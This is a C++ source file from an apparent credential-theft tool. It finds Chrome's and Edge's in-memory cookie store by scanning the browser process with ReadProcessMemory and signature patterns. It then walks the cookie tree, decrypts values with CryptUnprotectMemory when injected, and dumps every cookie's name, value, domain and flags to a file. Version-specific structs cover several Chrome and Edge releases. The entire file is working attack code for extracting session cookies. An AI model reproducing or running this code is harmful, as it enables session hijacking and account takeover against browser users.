#include <Windows.h>
#include <string>
#include <map>
#include <memory>
#include <vector>

#include "Helper.h"
#include "Memory.h"

#pragma comment(lib, "Crypt32.lib")
void Memory::PrintAndDecrypt(BYTE* buf, DWORD dwSize, size_t origSize) {
    if (!::CryptUnprotectMemory(buf, dwSize, CRYPTPROTECTMEMORY_SAME_PROCESS)) {
        DEBUG_PRINT_ERROR_MESSAGE(TEXT("Failed to decrypt cookie value"), hOutFile);
    }
    else {
        char* decrypted = (char*)malloc(origSize + 1);
        memcpy_s(decrypted, origSize, buf, origSize);
        *(decrypted + origSize) = '\0';
        PRINT(hOutFile, "%s\n", decrypted);
        free(decrypted);
    }
    return;
}

void Memory::ReadVector(RemoteVector vector, size_t origSize) {
    size_t szSize = vector.end_ - vector.begin_;
    if (szSize <= 0) {
        //Some cookies just are like that. tapad.com cookie: TapAd_3WAY_SYNCS for example is buggy even with browser tools
        PRINT(hOutFile, "[-] Invalid value length\n");
        return;
    }

    BYTE* buf = (BYTE*)malloc(szSize+1); //+1 for the string termination
    if (buf == 0 || !ReadProcessMemory(hProcess, reinterpret_cast<LPCVOID>(vector.begin_), buf, szSize, nullptr)) {
        DEBUG_PRINT_ERROR_MESSAGE(TEXT("Failed to read encrypted cookie value"), hOutFile);
        free(buf);
        return;
    }
    if (this->injected)
        PrintAndDecrypt(buf, szSize, origSize);
    else {
        memcpy_s(buf + szSize, 1, "\0", 1);
        PRINT(hOutFile, "%s\n", buf);
    }

    free(buf);
}

//Since Chrome uses std::string type a lot, we need to take into account if the string has been optimized to use Small String Optimization
//Or if it is stored in another address
void Memory::ReadString(OptimizedString string) {
    if (string.len > 23)
    {
        RemoteString longString = { 0 };
        std::memcpy(&longString, &string.buf, sizeof(RemoteString));

        if (longString.dataAddress != 0) {
#ifdef _DEBUG
            PRINT(hOutFile, "Attempting to read the cookie value from address: 0x%p\n", (void*)longString.dataAddress);
#endif
            unsigned char* buf = (unsigned char*)malloc(longString.strMax);
            if (buf == 0 || !ReadProcessMemory(hProcess, reinterpret_cast<LPCVOID>(longString.dataAddress), buf, longString.strLen + 1, nullptr)) {
                DEBUG_PRINT_ERROR_MESSAGE(TEXT("Failed to read cookie value"), hOutFile);
                free(buf);
                return;
            }
            PRINT(hOutFile, "%s\n", buf);
            free(buf);
        }
    }
    else
        PRINT(hOutFile, "%s\n", string.buf);

}

void Memory::PrintTimeStamp(int64_t timeStamp) {
    ULONGLONG fileTimeTicks = timeStamp * 10;

    FILETIME fileTime;
    fileTime.dwLowDateTime = static_cast<DWORD>(fileTimeTicks & 0xFFFFFFFF);
    fileTime.dwHighDateTime = static_cast<DWORD>(fileTimeTicks >> 32);

    SYSTEMTIME systemTime;
    FileTimeToSystemTime(&fileTime, &systemTime);

    PRINT(hOutFile, "%04hu-%02hu-%02hu %02hu:%02hu:%02hu\n",
        systemTime.wYear, systemTime.wMonth, systemTime.wDay,
        systemTime.wHour, systemTime.wMinute, systemTime.wSecond);
}

void Memory::PrintValuesEdge(CanonicalCookieEdge130 cookie) {
    PRINT(hOutFile, "    Name: ");
    Memory::ReadString(cookie.name);
    PRINT(hOutFile, "    Value: ");
    Memory::ReadString(cookie.value);
    PRINT(hOutFile, "    Domain: ");
    Memory::ReadString(cookie.domain);
    PRINT(hOutFile, "    Path: ");
    Memory::ReadString(cookie.path);
    PRINT(hOutFile, "    Creation time: ");
    Memory::PrintTimeStamp(cookie.creation_date);
    PRINT(hOutFile, "    Expiration time: ");
    Memory::PrintTimeStamp(cookie.expiry_date);
    PRINT(hOutFile, "    Last accessed: ");
    Memory::PrintTimeStamp(cookie.last_access_date);
    PRINT(hOutFile, "    Last updated: ");
    Memory::PrintTimeStamp(cookie.last_update_date);
    PRINT(hOutFile, "    Secure: %s\n", cookie.secure ? "True" : "False");
    PRINT(hOutFile, "    HttpOnly: %s\n", cookie.httponly ? "True" : "False");

    PRINT(hOutFile, "\n");
}

void Memory::PrintValuesEdge(CanonicalCookieEdge cookie) {
    PRINT(hOutFile, "    Name: ");
    Memory::ReadString(cookie.name);
    PRINT(hOutFile, "    Value: ");
    Memory::ReadVector(cookie.value.maybe_encrypted_data_, cookie.value.original_size_);
    PRINT(hOutFile, "    Domain: ");
    Memory::ReadString(cookie.domain);
    PRINT(hOutFile, "    Path: ");
    Memory::ReadString(cookie.path);
    PRINT(hOutFile, "    Creation time: ");
    Memory::PrintTimeStamp(cookie.creation_date);
    PRINT(hOutFile, "    Expiration time: ");
    Memory::PrintTimeStamp(cookie.expiry_date);
    PRINT(hOutFile, "    Last accessed: ");
    Memory::PrintTimeStamp(cookie.last_access_date);
    PRINT(hOutFile, "    Last updated: ");
    Memory::PrintTimeStamp(cookie.last_update_date);
    PRINT(hOutFile, "    Secure: %s\n", cookie.secure ? "True" : "False");
    PRINT(hOutFile, "    HttpOnly: %s\n", cookie.httponly ? "True" : "False");

    PRINT(hOutFile, "\n");
}

void Memory::PrintValuesChrome(CanonicalCookieChrome cookie) {
    PRINT(hOutFile, "    Name: ");
    Memory::ReadString(cookie.name);
    PRINT(hOutFile, "    Value: ");
    Memory::ReadVector(cookie.value.maybe_encrypted_data_, cookie.value.original_size_);
    PRINT(hOutFile, "    Domain: ");
    Memory::ReadString(cookie.domain);
    PRINT(hOutFile, "    Path: ");
    Memory::ReadString(cookie.path);
    PRINT(hOutFile, "    Creation time: ");
    Memory::PrintTimeStamp(cookie.creation_date);
    PRINT(hOutFile, "    Expiration time: ");
    Memory::PrintTimeStamp(cookie.expiry_date);
    PRINT(hOutFile, "    Last accessed: ");
    Memory::PrintTimeStamp(cookie.last_access_date);
    PRINT(hOutFile, "    Last updated: ");
    Memory::PrintTimeStamp(cookie.last_update_date);
    PRINT(hOutFile, "    Secure: %s\n", cookie.secure ? "True" : "False");
    PRINT(hOutFile, "    HttpOnly: %s\n", cookie.httponly ? "True" : "False");

    PRINT(hOutFile, "\n");
}

void Memory::PrintValuesChrome(CanonicalCookieChrome130 cookie) {
    PRINT(hOutFile, "    Name: ");
    Memory::ReadString(cookie.name);
    PRINT(hOutFile, "    Value: ");
    Memory::ReadString(cookie.value);
    PRINT(hOutFile, "    Domain: ");
    Memory::ReadString(cookie.domain);
    PRINT(hOutFile, "    Path: ");
    Memory::ReadString(cookie.path);
    PRINT(hOutFile, "    Creation time: ");
    Memory::PrintTimeStamp(cookie.creation_date);
    PRINT(hOutFile, "    Expiration time: ");
    Memory::PrintTimeStamp(cookie.expiry_date);
    PRINT(hOutFile, "    Last accessed: ");
    Memory::PrintTimeStamp(cookie.last_access_date);
    PRINT(hOutFile, "    Last updated: ");
    Memory::PrintTimeStamp(cookie.last_update_date);
    PRINT(hOutFile, "    Secure: %s\n", cookie.secure ? "True" : "False");
    PRINT(hOutFile, "    HttpOnly: %s\n", cookie.httponly ? "True" : "False");

    PRINT(hOutFile, "\n");
}

void Memory::PrintValuesChrome(CanonicalCookie124 cookie) {
    PRINT(hOutFile, "    Name: ");
    Memory::ReadString(cookie.name);
    PRINT(hOutFile, "    Value: ");
    Memory::ReadString(cookie.value);
    PRINT(hOutFile, "    Domain: ");
    Memory::ReadString(cookie.domain);
    PRINT(hOutFile, "    Path: ");
    Memory::ReadString(cookie.path);
    PRINT(hOutFile, "    Creation time: ");
    Memory::PrintTimeStamp(cookie.creation_date);
    PRINT(hOutFile, "    Expiration time: ");
    Memory::PrintTimeStamp(cookie.expiry_date);
    PRINT(hOutFile, "    Last accessed: ");
    Memory::PrintTimeStamp(cookie.last_access_date);
    PRINT(hOutFile, "    Last updated: ");
    Memory::PrintTimeStamp(cookie.last_update_date);
    PRINT(hOutFile, "    Secure: %s\n", cookie.secure ? "True" : "False");
    PRINT(hOutFile, "    HttpOnly: %s\n", cookie.httponly ? "True" : "False");

    PRINT(hOutFile, "\n");
}

void Memory::PrintValuesOld(CanonicalCookieOld cookie) {
    PRINT(hOutFile, "    Name: ");
    Memory::ReadString(cookie.name);
    PRINT(hOutFile, "    Value: ");
    Memory::ReadString(cookie.value);
    PRINT(hOutFile, "    Domain: ");
    Memory::ReadString(cookie.domain);
    PRINT(hOutFile, "    Path: ");
    Memory::ReadString(cookie.path);
    PRINT(hOutFile, "    Creation time: ");
    Memory::PrintTimeStamp(cookie.creation_date);
    PRINT(hOutFile, "    Expiration time: ");
    Memory::PrintTimeStamp(cookie.expiry_date);
    PRINT(hOutFile, "    Last accessed: ");
    Memory::PrintTimeStamp(cookie.last_access_date);
    PRINT(hOutFile, "    Last updated: ");
    Memory::PrintTimeStamp(cookie.last_update_date);

    PRINT(hOutFile, "\n");
}

void Memory::ProcessNodeValue(uintptr_t Valueaddr) {

    if (targetConfig == Chrome) {
        CanonicalCookieChrome cookie = { 0 };
        if (!ReadProcessMemory(hProcess, reinterpret_cast<LPCVOID>(Valueaddr), &cookie, sizeof(CanonicalCookieChrome), nullptr)) {
            PrintErrorWithMessage(TEXT("Failed to read cookie struct"), this->hOutFile);
            return;
        }
        Memory::PrintValuesChrome(cookie);

    }
    else if (targetConfig == Edge) {
        CanonicalCookieEdge cookie = { 0 };
        if (!ReadProcessMemory(hProcess, reinterpret_cast<LPCVOID>(Valueaddr), &cookie, sizeof(CanonicalCookieEdge), nullptr)) {
            PrintErrorWithMessage(TEXT("Failed to read cookie struct"), this->hOutFile);
            return;
        }
        Memory::PrintValuesEdge(cookie);
    }
    else if (targetConfig == Edge130) {
        CanonicalCookieEdge130 cookie = { 0 };
        if (!ReadProcessMemory(hProcess, reinterpret_cast<LPCVOID>(Valueaddr), &cookie, sizeof(CanonicalCookieEdge130), nullptr)) {
            PrintErrorWithMessage(TEXT("Failed to read cookie struct"), this->hOutFile);
            return;
        }
        Memory::PrintValuesEdge(cookie);
    }
    else if (targetConfig == OldChrome) {
        CanonicalCookieOld cookie = { 0 };
        if (!ReadProcessMemory(hProcess, reinterpret_cast<LPCVOID>(Valueaddr), &cookie, sizeof(CanonicalCookieOld), nullptr)) {
            PrintErrorWithMessage(TEXT("Failed to read cookie struct"), this->hOutFile);
            return;
        }
        Memory::PrintValuesOld(cookie);
    }
    else if (targetConfig == Chrome124) {
        CanonicalCookie124 cookie = { 0 };
        if (!ReadProcessMemory(hProcess, reinterpret_cast<LPCVOID>(Valueaddr), &cookie, sizeof(CanonicalCookie124), nullptr)) {
            PrintErrorWithMessage(TEXT("Failed to read cookie struct"), this->hOutFile);
            return;
        }
        Memory::PrintValuesChrome(cookie);
    }
    else if (targetConfig == Chrome130) {
        CanonicalCookieChrome130 cookie = { 0 };
        if (!ReadProcessMemory(hProcess, reinterpret_cast<LPCVOID>(Valueaddr), &cookie, sizeof(CanonicalCookieChrome130), nullptr)) {
            PrintErrorWithMessage(TEXT("Failed to read cookie struct"), this->hOutFile);
            return;
        }
        Memory::PrintValuesChrome(cookie);
    }
    else {
        PRINT(hOutFile, "[-] Could not read cookie values: Unknown configuration %d", targetConfig);
    }

}

void Memory::ProcessNode(const Node& node) {
    // Process the current node
    PRINT(hOutFile, "Cookie Key: ");
    Memory::ReadString(node.key);

#ifdef _DEBUG
    PRINT(hOutFile, "Attempting to read cookie values from address:  0x%p\n", (void*)node.valueAddress);
#endif
    Memory::ProcessNodeValue(node.valueAddress);

    // Process the left child if it exists
    if (node.left != 0) {
        Node leftNode;
        if (ReadProcessMemory(hProcess, reinterpret_cast<LPCVOID>(node.left), &leftNode, sizeof(Node), nullptr))
            Memory::ProcessNode(leftNode);
        else
            PrintErrorWithMessage(TEXT("Error reading left node"), this->hOutFile);
    }

    // Process the right child if it exists
    if (node.right != 0) {
        Node rightNode;
        if (ReadProcessMemory(hProcess, reinterpret_cast<LPCVOID>(node.right), &rightNode, sizeof(Node), nullptr))
            Memory::ProcessNode(rightNode);
        else
            PrintErrorWithMessage(TEXT("Error reading right node"), this->hOutFile);
    }
}

void Memory::WalkCookieMap(uintptr_t cookieMapAddress) {

    RootNode cookieMap;
    if (!ReadProcessMemory(hProcess, reinterpret_cast<LPCVOID>(cookieMapAddress), &cookieMap, sizeof(RootNode), nullptr)) {
        PrintErrorWithMessage(TEXT("Failed to read the root node from given address\n"), this->hOutFile);
        return;
    }

    // Process the root node
#ifdef _DEBUG
    PRINT(hOutFile, "Address of beginNode: 0x%p\n", (void*)cookieMap.beginNode);
    PRINT(hOutFile, "Address of firstNode: 0x%p\n", (void*)cookieMap.firstNode);
    PRINT(hOutFile, "Size of the cookie map: %Iu\n", cookieMap.size);
#endif // _DEBUG

    PRINT(hOutFile, "[*] Number of available cookies: %Iu\n", cookieMap.size);

    if (cookieMap.firstNode == 0 || cookieMap.size == 0) //CookieMap was empty
    {
        PRINT(hOutFile, "[*] This Cookie map was empty\n");
        return;
    }

    // Process the first node in the binary search tree
    Node firstNode;
    if (ReadProcessMemory(hProcess, reinterpret_cast<LPCVOID>(cookieMap.firstNode), &firstNode, sizeof(Node), nullptr) && &firstNode != nullptr)
        Memory::ProcessNode(firstNode);
    else
        PrintErrorWithMessage(TEXT("Error reading first node\n"), this->hOutFile);
}

BOOL Memory::MyMemCmp(BYTE* source, const BYTE* searchPattern, size_t num) {

    for (size_t i = 0; i < num; ++i) {
        if (searchPattern[i] == 0xAA)
            continue;
        if (source[i] != searchPattern[i]) {
            return FALSE;
        }
    }

    return TRUE;
}

void Memory::PatchPattern(BYTE* pattern, BYTE baseAddrPattern[], size_t offset) {
    size_t szAddr = sizeof(uintptr_t) - 1;
    for (offset -= 1; szAddr > 3; offset--) {
        pattern[offset] = baseAddrPattern[szAddr];
        szAddr--;
    }
}

BYTE* Memory::PatchBaseAddress(const BYTE* pattern, size_t patternSize, uintptr_t baseAddress) {

    //Copy the pattern
    BYTE* newPattern = (BYTE*)malloc(sizeof(BYTE) * patternSize);
    for (size_t i = 0; i < patternSize; i++)
        newPattern[i] = pattern[i];

    BYTE baseAddrPattern[sizeof(uintptr_t)];
    ConvertToByteArray(baseAddress, baseAddrPattern, sizeof(uintptr_t));

    PatchPattern(newPattern, baseAddrPattern, 16);
    PatchPattern(newPattern, baseAddrPattern, 24);
    PatchPattern(newPattern, baseAddrPattern, 56);
    PatchPattern(newPattern, baseAddrPattern, 80);
    PatchPattern(newPattern, baseAddrPattern, 136);
    PatchPattern(newPattern, baseAddrPattern, 168);
    PatchPattern(newPattern, baseAddrPattern, 176);
    PatchPattern(newPattern, baseAddrPattern, 184);

    return newPattern;
}

BOOL Memory::FindPattern(const BYTE* pattern, size_t patternSize, uintptr_t* cookieMonsterInstances, size_t& szCookieMonster) {

    SYSTEM_INFO systemInfo;
    GetSystemInfo(&systemInfo);

    uintptr_t startAddress = reinterpret_cast<uintptr_t>(systemInfo.lpMinimumApplicationAddress);
    uintptr_t endAddress = reinterpret_cast<uintptr_t>(systemInfo.lpMaximumApplicationAddress);

    MEMORY_BASIC_INFORMATION memoryInfo;

    while (startAddress < endAddress) {
        if (VirtualQueryEx(hProcess, reinterpret_cast<LPCVOID>(startAddress), &memoryInfo, sizeof(memoryInfo)) == sizeof(memoryInfo)) {
            if (memoryInfo.State == MEM_COMMIT && (memoryInfo.Protect & PAGE_READWRITE) != 0 && memoryInfo.Type == MEM_PRIVATE) {
                BYTE* buffer = new BYTE[memoryInfo.RegionSize];
                SIZE_T bytesRead;

                BYTE* newPattern = Memory::PatchBaseAddress(pattern, patternSize, reinterpret_cast<uintptr_t>(memoryInfo.BaseAddress));

                //Error code 299
                //Only part of a ReadProcessMemory or WriteProcessMemory request was completed. 
                //We are fine with that -- We were not fine with that
                //if (ReadProcessMemory(hProcess, memoryInfo.BaseAddress, buffer, memoryInfo.RegionSize, &bytesRead) || GetLastError() == 299) {
                if (ReadProcessMemory(hProcess, memoryInfo.BaseAddress, buffer, memoryInfo.RegionSize, &bytesRead)) {
                    for (size_t i = 0; i <= bytesRead - patternSize; ++i) {
                        if (MyMemCmp(buffer + i, newPattern, patternSize)) {
                            uintptr_t resultAddress = reinterpret_cast<uintptr_t>(memoryInfo.BaseAddress) + i;
                            uintptr_t offset = resultAddress - reinterpret_cast<uintptr_t>(memoryInfo.BaseAddress);
#ifdef _DEBUG
                            PRINT(hOutFile, "Found pattern on AllocationBase: 0x%p, BaseAddress: 0x%p, Offset: 0x%Ix\n",
                                memoryInfo.AllocationBase,
                                memoryInfo.BaseAddress,
                                offset);
#endif
                            if (szCookieMonster >= 1000) {
                                free(newPattern);
                                return TRUE;
                            }

                            cookieMonsterInstances[szCookieMonster] = resultAddress;
                            szCookieMonster++;
                        }
                    }
                }
                else {
                    //This happens quite a lot, will not print these errors on release build
                    //DEBUG_PRINT_ERROR_MESSAGE(TEXT("ReadProcessMemory failed\n"));
                }
                free(newPattern);
                delete[] buffer;
            }

            startAddress += memoryInfo.RegionSize;
        }
        else {
            DEBUG_PRINT_ERROR_MESSAGE(TEXT("VirtualQueryEx failed\n"), hOutFile);
            break;  // VirtualQueryEx failed
        }
    }
    if (szCookieMonster > 0)
        return TRUE;
    return FALSE;
}

BOOL Memory::FindLargestSection(uintptr_t moduleAddr, uintptr_t& resultAddress) {

    MEMORY_BASIC_INFORMATION memoryInfo;
    uintptr_t offset = moduleAddr;

    SIZE_T largestRegion = 0;

    while (VirtualQueryEx(hProcess, reinterpret_cast<LPVOID>(offset), &memoryInfo, sizeof(memoryInfo)))
    {
        if (memoryInfo.State == MEM_COMMIT && (memoryInfo.Protect & PAGE_READONLY) != 0 && memoryInfo.Type == MEM_IMAGE)
        {
            if (memoryInfo.RegionSize > largestRegion) {
                largestRegion = memoryInfo.RegionSize;
                resultAddress = reinterpret_cast<uintptr_t>(memoryInfo.BaseAddress);
            }
        }
        offset += memoryInfo.RegionSize;
    }
    if (largestRegion > 0)
        return TRUE;

    return FALSE;
}